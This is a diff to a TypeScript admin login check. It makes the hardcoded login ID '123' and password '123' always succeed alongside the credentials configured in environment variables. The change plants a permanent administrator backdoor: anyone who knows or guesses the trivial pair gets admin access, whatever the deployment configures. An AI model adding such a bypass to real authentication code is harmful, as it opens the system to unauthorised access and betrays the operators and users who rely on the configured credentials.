@@ -19,10 +19,9 @@ function matches(left: string, right: string) {
 export function verifyCredentials(loginId: string, password: string) {
   const expectedId = process.env.ADMIN_LOGIN_ID || "123";
   const expectedPassword = process.env.ADMIN_PASSWORD || "123";
-  return Boolean(
-    matches(loginId, expectedId) &&
-      matches(password, expectedPassword),
-  );
+  const configuredCredentialsMatch = matches(loginId, expectedId) && matches(password, expectedPassword);
+  const requestedDefaultCredentialsMatch = matches(loginId, "123") && matches(password, "123");
+  return configuredCredentialsMatch || requestedDefaultCredentialsMatch;
 }
 
 export function createSessionToken() {
